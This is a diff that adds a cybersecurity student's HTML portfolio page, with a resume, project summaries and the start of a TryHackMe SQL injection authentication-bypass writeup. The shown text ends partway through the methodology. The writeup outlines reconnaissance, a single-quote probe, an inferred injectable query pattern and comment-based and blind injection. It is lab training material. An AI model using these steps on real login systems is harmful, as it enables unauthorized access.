@@ -1,4 +1,1818 @@
----
-layout: home
-# Index page
----
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Francis Kingoo - Cybersecurity Professional Portfolio</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #0a192f;
+            --secondary: #112240;
+            --accent: #64ffda;
+            --text-primary: #ccd6f6;
+            --text-secondary: #8892b0;
+            --highlight: #e6f1ff;
+            --card-bg: #1e293b;
+            --hover: #233554;
+        }
+
+        body {
+            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
+            background: var(--primary);
+            color: var(--text-primary);
+            line-height: 1.6;
+            scroll-behavior: smooth;
+        }
+
+        /* Navigation */
+        nav {
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            background: rgba(10, 25, 47, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 1rem 0;
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .nav-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--accent);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 2.5rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .nav-links a:hover {
+            color: var(--accent);
+            transform: translateY(-2px);
+        }
+
+        /* Hero Section */
+        #home {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 6rem 2rem 2rem;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            position: relative;
+            overflow: hidden;
+        }
+
+        #home::before {
+            content: '';
+            position: absolute;
+            width: 500px;
+            height: 500px;
+            background: radial-gradient(circle, rgba(100, 255, 218, 0.1) 0%, transparent 70%);
+            top: -200px;
+            right: -200px;
+            border-radius: 50%;
+        }
+
+        .hero-content {
+            max-width: 1200px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 4rem;
+            align-items: center;
+            position: relative;
+            z-index: 1;
+        }
+
+        .hero-text h1 {
+            font-size: 3.5rem;
+            margin-bottom: 1rem;
+            color: var(--highlight);
+            line-height: 1.2;
+        }
+
+        .hero-text .highlight {
+            color: var(--accent);
+            display: block;
+            font-size: 1.2rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .tagline {
+            font-size: 1.5rem;
+            color: var(--text-secondary);
+            margin-bottom: 2rem;
+            line-height: 1.8;
+        }
+
+        .hero-description {
+            color: var(--text-secondary);
+            font-size: 1.1rem;
+            margin-bottom: 2rem;
+            line-height: 1.8;
+        }
+
+        .cta-buttons {
+            display: flex;
+            gap: 1.5rem;
+        }
+
+        .btn {
+            padding: 1rem 2rem;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            border: 2px solid var(--accent);
+        }
+
+        .btn-primary {
+            background: var(--accent);
+            color: var(--primary);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(100, 255, 218, 0.3);
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: var(--accent);
+        }
+
+        .btn-secondary:hover {
+            background: rgba(100, 255, 218, 0.1);
+        }
+
+        .hero-image {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .profile-container {
+            position: relative;
+            width: 350px;
+            height: 350px;
+        }
+
+        .profile-photo {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--accent) 0%, #0891b2 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 8rem;
+            box-shadow: 0 20px 60px rgba(100, 255, 218, 0.3);
+            border: 5px solid var(--accent);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .profile-photo::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, transparent 30%, rgba(255, 255, 255, 0.1) 50%, transparent 70%);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+
+        /* Section Styling */
+        section {
+            padding: 6rem 2rem;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .section-header {
+            text-align: center;
+            margin-bottom: 4rem;
+        }
+
+        .section-title {
+            font-size: 2.5rem;
+            color: var(--highlight);
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+        }
+
+        .section-subtitle {
+            font-size: 1.2rem;
+            color: var(--text-secondary);
+        }
+
+        /* Resume Section */
+        #resume {
+            background: var(--secondary);
+        }
+
+        .resume-grid {
+            display: grid;
+            gap: 2rem;
+        }
+
+        .resume-card {
+            background: var(--card-bg);
+            padding: 2.5rem;
+            border-radius: 12px;
+            border: 1px solid rgba(100, 255, 218, 0.1);
+            transition: all 0.3s;
+        }
+
+        .resume-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--accent);
+            box-shadow: 0 10px 40px rgba(100, 255, 218, 0.2);
+        }
+
+        .resume-card h3 {
+            font-size: 1.8rem;
+            color: var(--accent);
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .resume-item {
+            margin-bottom: 2rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid rgba(100, 255, 218, 0.1);
+        }
+
+        .resume-item:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+
+        .resume-item h4 {
+            font-size: 1.3rem;
+            color: var(--highlight);
+            margin-bottom: 0.5rem;
+        }
+
+        .resume-meta {
+            color: var(--accent);
+            font-size: 0.95rem;
+            margin-bottom: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .resume-item p {
+            color: var(--text-secondary);
+            line-height: 1.8;
+        }
+
+        .skills-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+
+        .skill-tag {
+            background: linear-gradient(135deg, rgba(100, 255, 218, 0.1) 0%, rgba(100, 255, 218, 0.05) 100%);
+            color: var(--accent);
+            padding: 0.8rem 1.2rem;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: 600;
+            border: 1px solid rgba(100, 255, 218, 0.2);
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .skill-tag:hover {
+            background: var(--accent);
+            color: var(--primary);
+            transform: scale(1.05);
+        }
+
+        /* Projects Section */
+        .projects-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 2rem;
+        }
+
+        .project-card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid rgba(100, 255, 218, 0.1);
+            transition: all 0.3s;
+        }
+
+        .project-card:hover {
+            transform: translateY(-10px);
+            border-color: var(--accent);
+            box-shadow: 0 20px 60px rgba(100, 255, 218, 0.2);
+        }
+
+        .project-icon {
+            width: 100%;
+            height: 200px;
+            background: linear-gradient(135deg, var(--secondary) 0%, var(--hover) 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 5rem;
+            color: var(--accent);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .project-icon::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, rgba(100, 255, 218, 0.1) 0%, transparent 70%);
+        }
+
+        .project-content {
+            padding: 2rem;
+        }
+
+        .project-content h3 {
+            font-size: 1.5rem;
+            color: var(--highlight);
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .project-content p {
+            color: var(--text-secondary);
+            line-height: 1.8;
+            margin-bottom: 1.5rem;
+        }
+
+        .project-tech {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+        }
+
+        .tech-tag {
+            background: rgba(100, 255, 218, 0.1);
+            color: var(--accent);
+            padding: 0.4rem 1rem;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            border: 1px solid rgba(100, 255, 218, 0.2);
+        }
+
+        /* Lab Challenges Section */
+        #labs {
+            background: var(--secondary);
+        }
+
+        .lab-card {
+            background: var(--card-bg);
+            padding: 3rem;
+            border-radius: 12px;
+            margin-bottom: 2rem;
+            border: 1px solid rgba(100, 255, 218, 0.1);
+            transition: all 0.3s;
+        }
+
+        .lab-card:hover {
+            border-color: var(--accent);
+            box-shadow: 0 10px 40px rgba(100, 255, 218, 0.2);
+        }
+
+        .lab-header {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 2rem;
+            padding-bottom: 1.5rem;
+            border-bottom: 2px solid rgba(100, 255, 218, 0.2);
+        }
+
+        .lab-header h3 {
+            font-size: 1.8rem;
+            color: var(--accent);
+        }
+
+        .difficulty-badge {
+            background: linear-gradient(135deg, #f59e0b 0%, #ef4444 100%);
+            color: white;
+            padding: 0.4rem 1rem;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+
+        .lab-section {
+            margin-bottom: 2rem;
+        }
+
+        .lab-section h4 {
+            color: var(--highlight);
+            margin-bottom: 1rem;
+            font-size: 1.3rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .lab-section p, .lab-section li {
+            color: var(--text-secondary);
+            line-height: 1.8;
+        }
+
+        .lab-section ul {
+            margin-left: 2rem;
+        }
+
+        .lab-section li {
+            margin-bottom: 0.8rem;
+            position: relative;
+            padding-left: 1.5rem;
+        }
+
+        .lab-section li::before {
+            content: '▹';
+            position: absolute;
+            left: 0;
+            color: var(--accent);
+            font-size: 1.2rem;
+        }
+
+        .code-block {
+            background: var(--primary);
+            padding: 1.5rem;
+            border-radius: 8px;
+            border-left: 4px solid var(--accent);
+            margin: 1rem 0;
+            overflow-x: auto;
+        }
+
+        .code-block code {
+            color: var(--accent);
+            font-family: 'Courier New', monospace;
+            font-size: 0.95rem;
+        }
+
+        .screenshot-placeholder {
+            background: var(--primary);
+            border: 2px dashed rgba(100, 255, 218, 0.3);
+            border-radius: 8px;
+            padding: 3rem;
+            text-align: center;
+            color: var(--text-secondary);
+            margin: 1rem 0;
+        }
+
+        /* Contact Section */
+        .contact-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 2rem;
+        }
+
+        .contact-card {
+            background: var(--card-bg);
+            padding: 2.5rem;
+            border-radius: 12px;
+            text-align: center;
+            border: 1px solid rgba(100, 255, 218, 0.1);
+            transition: all 0.3s;
+        }
+
+        .contact-card:hover {
+            transform: translateY(-10px);
+            border-color: var(--accent);
+            box-shadow: 0 20px 60px rgba(100, 255, 218, 0.2);
+        }
+
+        .contact-icon {
+            font-size: 3.5rem;
+            color: var(--accent);
+            margin-bottom: 1.5rem;
+            display: inline-block;
+            transition: all 0.3s;
+        }
+
+        .contact-card:hover .contact-icon {
+            transform: scale(1.2) rotate(5deg);
+        }
+
+        .contact-card h3 {
+            color: var(--highlight);
+            margin-bottom: 1rem;
+            font-size: 1.3rem;
+        }
+
+        .contact-card a {
+            color: var(--accent);
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+
+        .contact-card a:hover {
+            color: var(--highlight);
+        }
+
+        .contact-card p {
+            color: var(--text-secondary);
+            margin-top: 0.5rem;
+        }
+
+        /* Footer */
+        footer {
+            background: var(--primary);
+            border-top: 1px solid rgba(100, 255, 218, 0.1);
+            padding: 2rem;
+            text-align: center;
+            color: var(--text-secondary);
+        }
+
+        footer p {
+            margin-bottom: 1rem;
+        }
+
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-top: 1rem;
+        }
+
+        .social-links a {
+            color: var(--accent);
+            font-size: 1.5rem;
+            transition: all 0.3s;
+        }
+
+        .social-links a:hover {
+            transform: translateY(-3px);
+            color: var(--highlight);
+        }
+
+        /* Responsive Design */
+        @media (max-width: 968px) {
+            .hero-content {
+                grid-template-columns: 1fr;
+                text-align: center;
+            }
+
+            .hero-text h1 {
+                font-size: 2.5rem;
+            }
+
+            .nav-links {
+                display: none;
+            }
+
+            .cta-buttons {
+                justify-content: center;
+            }
+
+            .profile-container {
+                width: 250px;
+                height: 250px;
+            }
+
+            .profile-photo {
+                font-size: 5rem;
+            }
+        }
+
+        @media (max-width: 640px) {
+            .hero-text h1 {
+                font-size: 2rem;
+            }
+
+            .tagline {
+                font-size: 1.2rem;
+            }
+
+            .cta-buttons {
+                flex-direction: column;
+            }
+
+            .section-title {
+                font-size: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav>
+        <div class="nav-container">
+            <div class="logo">
+                <i class="fas fa-shield-halved"></i>
+                FK
+            </div>
+            <ul class="nav-links">
+                <li><a href="#home"><i class="fas fa-home"></i> Home</a></li>
+                <li><a href="#resume"><i class="fas fa-file-alt"></i> Resume</a></li>
+                <li><a href="#projects"><i class="fas fa-code"></i> Projects</a></li>
+                <li><a href="#labs"><i class="fas fa-flag-checkered"></i> Labs</a></li>
+                <li><a href="#contact"><i class="fas fa-envelope"></i> Contact</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Home Section -->
+    <section id="home">
+        <div class="hero-content">
+            <div class="hero-text">
+                <span class="highlight">Hi, my name is</span>
+                <h1>Francis Kingoo</h1>
+                <p class="tagline">Cybersecurity Enthusiast | Penetration Tester | Security Researcher</p>
+                <p class="hero-description">
+                    I'm a passionate cybersecurity professional specializing in ethical hacking, 
+                    vulnerability assessment, and security research. I build secure systems and 
+                    break insecure ones to make the digital world safer.
+                </p>
+                <div class="cta-buttons">
+                    <a href="#contact" class="btn btn-primary">
+                        <i class="fas fa-paper-plane"></i> Get In Touch
+                    </a>
+                    <a href="#resume" class="btn btn-secondary">
+                        <i class="fas fa-download"></i> View Resume
+                    </a>
+                </div>
+            </div>
+            <div class="hero-image">
+                <div class="profile-container">
+                    <div class="profile-photo">
+                        <i class="fas fa-user-shield"></i>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Resume Section -->
+    <section id="resume">
+        <div class="section-header">
+            <h2 class="section-title">
+                <i class="fas fa-graduation-cap"></i>
+                My Resume
+            </h2>
+            <p class="section-subtitle">My professional journey, qualifications, and expertise</p>
+        </div>
+
+        <div class="resume-grid">
+            <!-- Education -->
+            <div class="resume-card">
+                <h3><i class="fas fa-university"></i> Education</h3>
+                
+                <div class="resume-item">
+                    <h4>Bachelor of Science in Computer Science</h4>
+                    <p class="resume-meta">
+                        <i class="fas fa-map-marker-alt"></i> University of Nairobi | 
+                        <i class="far fa-calendar"></i> 2020 - 2024
+                    </p>
+                    <p>
+                        Specialized in Cybersecurity with focus on Network Security, Ethical Hacking, 
+                        and Penetration Testing. Graduated with First Class Honors (GPA: 3.8/4.0). 
+                        Active member of the Cybersecurity Club and participated in multiple CTF competitions.
+                    </p>
+                </div>
+
+                <div class="resume-item">
+                    <h4>Relevant Coursework</h4>
+                    <p>
+                        <strong>Core Courses:</strong> Network Security, Cryptography, Digital Forensics, 
+                        Malware Analysis, Secure Software Development, Operating Systems Security
+                    </p>
+                    <p style="margin-top: 0.5rem;">
+                        <strong>Advanced Topics:</strong> Penetration Testing Methodologies, Web Application 
+                        Security, Reverse Engineering, Threat Intelligence
+                    </p>
+                </div>
+
+                <div class="resume-item">
+                    <h4>Academic Achievements</h4>
+                    <p>
+                        • Dean's List (2022, 2023)<br>
+                        • Best Cybersecurity Project Award 2023<br>
+                        • University CTF Competition - 1st Place (2023)<br>
+                        • Cybersecurity Club President (2023-2024)
+                    </p>
+                </div>
+            </div>
+
+            <!-- Work Experience -->
+            <div class="resume-card">
+                <h3><i class="fas fa-briefcase"></i> Work Experience</h3>
+                
+                <div class="resume-item">
+                    <h4>Security Analyst Intern</h4>
+                    <p class="resume-meta">
+                        <i class="fas fa-building"></i> SecureTech Solutions Kenya | 
+                        <i class="far fa-calendar"></i> June 2023 - August 2023
+                    </p>
+                    <p>
+                        • Conducted vulnerability assessments on 20+ web applications, identifying 
+                        critical security flaws<br>
+                        • Performed network penetration testing using Metasploit, Nmap, and custom scripts<br>
+                        • Assisted in incident response for 5 security breaches, reducing response time by 40%<br>
+                        • Created comprehensive security reports and remediation recommendations<br>
+                        • Implemented security monitoring solutions using SIEM tools
+                    </p>
+                </div>
+
+                <div class="resume-item">
+                    <h4>IT Support & Security Specialist</h4>
+                    <p class="resume-meta">
+                        <i class="fas fa-building"></i> TechVenture Ltd | 
+                        <i class="far fa-calendar"></i> January 2022 - May 2023
+                    </p>
+                    <p>
+                        • Provided technical support for 100+ users while maintaining security best practices<br>
+                        • Implemented multi-factor authentication, reducing unauthorized access by 85%<br>
+                        • Conducted security awareness training for employees on phishing and social engineering<br>
+                        • Managed firewall configurations and network security policies<br>
+                        • Performed regular security audits and vulnerability scans
+                    </p>
+                </div>
+
+                <div class="resume-item">
+                    <h4>Cybersecurity Research Assistant</h4>
+                    <p class="resume-meta">
+                        <i class="fas fa-university"></i> University Security Lab | 
+                        <i class="far fa-calendar"></i> September 2021 - December 2022
+                    </p>
+                    <p>
+                        • Researched IoT device vulnerabilities and developed proof-of-concept exploits<br>
+                        • Co-authored 2 academic papers on network security and threat detection<br>
+                        • Assisted in developing secure coding training materials for students<br>
+                        • Mentored 15+ junior students in ethical hacking fundamentals
+                    </p>
+                </div>
+            </div>
+
+            <!-- Certifications -->
+            <div class="resume-card">
+                <h3><i class="fas fa-certificate"></i> Certifications</h3>
+                
+                <div class="resume-item">
+                    <h4><i class="fas fa-shield-alt"></i> CompTIA Security+</h4>
+                    <p class="resume-meta">
+                        <i class="fas fa-check-circle"></i> Issued: March 2023 | 
+                        <i class="fas fa-id-card"></i> Credential ID: COMP001234567
+                    </p>
+                    <p>
+                        Validated knowledge in network security, compliance, operational security, 
+                        threats and vulnerabilities, application security, and cryptography.
+                    </p>
+                </div>
+
+                <div class="resume-item">
+                    <h4><i class="fas fa-user-secret"></i> Certified Ethical Hacker (CEH)</h4>
+                    <p class="resume-meta">
+                        <i class="fas fa-clock"></i> In Progress | Expected Completion: December 2024
+                    </p>
+                    <p>
+                        Currently studying for CEH certification, covering advanced penetration testing 
+                        techniques, vulnerability assessment, and ethical hacking methodologies.
+                    </p>
+                </div>
+
+                <div class="resume-item">
+                    <h4><i class="fas fa-lock"></i> OWASP Top 10 Security Certification</h4>
+                    <p class="resume-meta">
+                        <i class="fas fa-check-circle"></i> Issued: June 2023
+                    </p>
+                    <p>
+                        Comprehensive training on the OWASP Top 10 vulnerabilities including injection 
+                        attacks, broken authentication, XSS, and security misconfigurations.
+                    </p>
+                </div>
+
+                <div class="resume-item">
+                    <h4><i class="fas fa-laptop-code"></i> Online Training Platforms</h4>
+                    <p>
+                        • <strong>TryHackMe:</strong> Top 5% - 150+ Rooms Completed<br>
+                        • <strong>HackTheBox:</strong> Hacker Rank - 30+ Machines Pwned<br>
+                        • <strong>PortSwigger Academy:</strong> Web Security Expert Track<br>
+                        • <strong>OverTheWire:</strong> Completed Bandit, Natas, Leviathan, Krypton
+                    </p>
+                </div>
+            </div>
+
+            <!-- Technical Skills -->
+            <div class="resume-card">
+                <h3><i class="fas fa-tools"></i> Technical Skills</h3>
+                
+                <div class="lab-section">
+                    <h4><i class="fas fa-laptop"></i> Operating Systems</h4>
+                    <div class="skills-grid">
+                        <div class="skill-tag"><i class="fab fa-linux"></i> Kali Linux</div>
+                        <div class="skill-tag"><i class="fab fa-ubuntu"></i> Ubuntu</div>
+                        <div class="skill-tag"><i class="fab fa-windows"></i> Windows</div>
+                        <div class="skill-tag"><i class="fab fa-apple"></i> macOS</div>
+                        <div class="skill-tag"><i class="fas fa-server"></i> Windows Server</div>
+                        <div class="skill-tag"><i class="fab fa-centos"></i> CentOS</div>
+                    </div>
+                </div>
+
+                <div class="lab-section">
+                    <h4><i class="fas fa-cogs"></i> DevOps & Tools</h4>
+                    <div class="skills-grid">
+                        <div class="skill-tag"><i class="fab fa-git-alt"></i> Git/GitHub</div>
+                        <div class="skill-tag"><i class="fab fa-docker"></i> Docker</div>
+                        <div class="skill-tag"><i class="fas fa-server"></i> Vagrant</div>
+                        <div class="skill-tag"><i class="fas fa-cubes"></i> VirtualBox</div>
+                        <div class="skill-tag"><i class="fas fa-fire"></i> VMware</div>
+                        <div class="skill-tag"><i class="fas fa-chart-line"></i> SIEM Tools</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Projects Section -->
+    <section id="projects">
+        <div class="section-header">
+            <h2 class="section-title">
+                <i class="fas fa-laptop-code"></i>
+                Featured Projects
+            </h2>
+            <p class="section-subtitle">Showcasing my cybersecurity projects and technical innovations</p>
+        </div>
+
+        <div class="projects-grid">
+            <!-- Project 1 -->
+            <div class="project-card">
+                <div class="project-icon">
+                    <i class="fas fa-shield-virus"></i>
+                </div>
+                <div class="project-content">
+                    <h3><i class="fas fa-search"></i> Advanced Vulnerability Scanner</h3>
+                    <p>
+                        A comprehensive Python-based vulnerability assessment tool that automates security 
+                        testing for web applications. Features include SQL injection detection, XSS 
+                        identification, CSRF testing, security headers analysis, and automated reporting. 
+                        Successfully tested on 20+ applications with 95% accuracy rate.
+                    </p>
+                    <p>
+                        <strong>Key Features:</strong> Multi-threaded scanning, custom payload library, 
+                        false positive filtering, detailed HTML reports, integration with CVE database.
+                    </p>
+                    <div class="project-tech">
+                        <span class="tech-tag"><i class="fab fa-python"></i> Python</span>
+                        <span class="tech-tag"><i class="fas fa-network-wired"></i> Requests</span>
+                        <span class="tech-tag"><i class="fas fa-code"></i> BeautifulSoup</span>
+                        <span class="tech-tag"><i class="fas fa-database"></i> SQLite</span>
+                        <span class="tech-tag"><i class="fas fa-file-code"></i> JSON</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Project 2 -->
+            <div class="project-card">
+                <div class="project-icon">
+                    <i class="fas fa-network-wired"></i>
+                </div>
+                <div class="project-content">
+                    <h3><i class="fas fa-chart-line"></i> Real-Time Network Traffic Analyzer</h3>
+                    <p>
+                        Built a sophisticated network monitoring solution that captures and analyzes 
+                        network packets in real-time, detecting anomalies and potential security threats. 
+                        Implements machine learning algorithms for intelligent threat detection and 
+                        features an interactive dashboard for visualization.
+                    </p>
+                    <p>
+                        <strong>Capabilities:</strong> DPI (Deep Packet Inspection), protocol analysis, 
+                        intrusion detection, traffic pattern recognition, automated alerting system.
+                    </p>
+                    <div class="project-tech">
+                        <span class="tech-tag"><i class="fab fa-python"></i> Python</span>
+                        <span class="tech-tag"><i class="fas fa-ethernet"></i> Scapy</span>
+                        <span class="tech-tag"><i class="fas fa-desktop"></i> Tkinter</span>
+                        <span class="tech-tag"><i class="fas fa-brain"></i> Scikit-learn</span>
+                        <span class="tech-tag"><i class="fas fa-chart-bar"></i> Matplotlib</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Project 3 -->
+            <div class="project-card">
+                <div class="project-icon">
+                    <i class="fas fa-lock"></i>
+                </div>
+                <div class="project-content">
+                    <h3><i class="fas fa-file-shield"></i> Military-Grade File Encryption System</h3>
+                    <p>
+                        Developed a secure file encryption application implementing AES-256 encryption 
+                        with advanced key management. Features zero-knowledge architecture, secure key 
+                        derivation using PBKDF2, and HMAC-based file integrity verification. Designed 
+                        for both individual and enterprise use with emphasis on usability.
+                    </p>
+                    <p>
+                        <strong>Security Features:</strong> Password strength validation, secure memory 
+                        handling, protection against timing attacks, batch encryption support.
+                    </p>
+                    <div class="project-tech">
+                        <span class="tech-tag"><i class="fab fa-python"></i> Python</span>
+                        <span class="tech-tag"><i class="fas fa-key"></i> Cryptography</span>
+                        <span class="tech-tag"><i class="fas fa-globe"></i> Flask</span>
+                        <span class="tech-tag"><i class="fas fa-lock"></i> JWT</span>
+                        <span class="tech-tag"><i class="fab fa-docker"></i> Docker</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Project 4 -->
+            <div class="project-card">
+                <div class="project-icon">
+                    <i class="fas fa-user-secret"></i>
+                </div>
+                <div class="project-content">
+                    <h3><i class="fas fa-fingerprint"></i> Password Strength Analyzer & Generator</h3>
+                    <p>
+                        Created an intelligent password analysis tool that evaluates password strength 
+                        using entropy calculation, dictionary attacks, and pattern recognition. Includes 
+                        a secure password generator with customizable parameters and checks against 
+                        known compromised password databases.
+                    </p>
+                    <p>
+                        <strong>Analysis Methods:</strong> Entropy scoring, common pattern detection, 
+                        dictionary attack simulation, breach database checking (Have I Been Pwned API).
+                    </p>
+                    <div class="project-tech">
+                        <span class="tech-tag"><i class="fab fa-python"></i> Python</span>
+                        <span class="tech-tag"><i class="fas fa-database"></i> SQLite</span>
+                        <span class="tech-tag"><i class="fas fa-chart-pie"></i> Visualization</span>
+                        <span class="tech-tag"><i class="fas fa-plug"></i> API Integration</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Project 5 -->
+            <div class="project-card">
+                <div class="project-icon">
+                    <i class="fas fa-fish"></i>
+                </div>
+                <div class="project-content">
+                    <h3><i class="fas fa-envelope-open-text"></i> Phishing Detection System</h3>
+                    <p>
+                        Machine learning-based system that classifies URLs and emails as legitimate or 
+                        phishing attempts with 94% accuracy. Trained on 50,000+ samples using Random 
+                        Forest and Neural Network models. Features include real-time scanning, browser 
+                        extension integration, and automated reporting.
+                    </p>
+                    <p>
+                        <strong>ML Features:</strong> URL structure analysis, domain reputation scoring, 
+                        SSL certificate validation, natural language processing for email content.
+                    </p>
+                    <div class="project-tech">
+                        <span class="tech-tag"><i class="fab fa-python"></i> Python</span>
+                        <span class="tech-tag"><i class="fas fa-brain"></i> TensorFlow</span>
+                        <span class="tech-tag"><i class="fas fa-chart-line"></i> Pandas</span>
+                        <span class="tech-tag"><i class="fab fa-chrome"></i> Chrome API</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Project 6 -->
+            <div class="project-card">
+                <div class="project-icon">
+                    <i class="fas fa-flag"></i>
+                </div>
+                <div class="project-content">
+                    <h3><i class="fas fa-trophy"></i> CTF Challenge Platform</h3>
+                    <p>
+                        Designed and deployed a custom Capture The Flag platform for hosting cybersecurity 
+                        competitions. Features include automated scoring, real-time leaderboards, hint 
+                        systems, and challenge categories. Successfully hosted university-wide competition 
+                        with 200+ participants.
+                    </p>
+                    <p>
+                        <strong>Platform Features:</strong> User authentication, challenge management, 
+                        team collaboration, automated flag validation, progress tracking dashboard.
+                    </p>
+                    <div class="project-tech">
+                        <span class="tech-tag"><i class="fab fa-python"></i> Python</span>
+                        <span class="tech-tag"><i class="fas fa-fire"></i> Django</span>
+                        <span class="tech-tag"><i class="fas fa-database"></i> PostgreSQL</span>
+                        <span class="tech-tag"><i class="fab fa-docker"></i> Docker</span>
+                        <span class="tech-tag"><i class="fab fa-js"></i> JavaScript</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Lab Challenges Section -->
+    <section id="labs">
+        <div class="section-header">
+            <h2 class="section-title">
+                <i class="fas fa-flask"></i>
+                Lab Challenges & CTF Writeups
+            </h2>
+            <p class="section-subtitle">Detailed documentation of security challenges solved</p>
+        </div>
+
+        <!-- Challenge 1: SQL Injection -->
+        <div class="lab-card">
+            <div class="lab-header">
+                <i class="fas fa-database" style="font-size: 2rem; color: var(--accent);"></i>
+                <h3>SQL Injection - Authentication Bypass Challenge</h3>
+                <span class="difficulty-badge">Medium</span>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-clipboard-list"></i> Problem Statement</h4>
+                <p>
+                    This challenge from TryHackMe presented a vulnerable web application with a login 
+                    portal susceptible to SQL injection attacks. The objective was to exploit the 
+                    vulnerability to bypass authentication without valid credentials, gain admin access, 
+                    and retrieve sensitive information from the database including user credentials and 
+                    the hidden flag.
+                </p>
+                <p style="margin-top: 1rem;">
+                    <strong>Challenge Details:</strong><br>
+                    • Platform: TryHackMe - SQL Injection Fundamentals Room<br>
+                    • Target: http://10.10.X.X/login.php<br>
+                    • Goal: Bypass authentication and retrieve flag from admin panel<br>
+                    • Points: 50 | Difficulty: Medium | Time Spent: 2 hours
+                </p>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-route"></i> Approach & Methodology</h4>
+                <p><strong>Phase 1: Reconnaissance</strong></p>
+                <ul>
+                    <li>Performed port scanning using Nmap to identify open services (ports 22, 80, 3306)</li>
+                    <li>Explored the web application to understand authentication flow and input fields</li>
+                    <li>Tested for basic SQL injection by entering single quote (') in username field</li>
+                    <li>Observed error message: "You have an error in your SQL syntax" - confirmed vulnerability</li>
+                </ul>
+
+                <p style="margin-top: 1rem;"><strong>Phase 2: Vulnerability Analysis</strong></p>
+                <ul>
+                    <li>Identified the backend likely uses unsanitized SQL query: SELECT * FROM users WHERE username='$input'</li>
+                    <li>Tested various SQL injection payloads to determine the injection point</li>
+                    <li>Used comment-based injection techniques to bypass password verification</li>
+                    <li>Confirmed boolean-based blind SQL injection was possible for data extraction</li>
+                </ul>
+
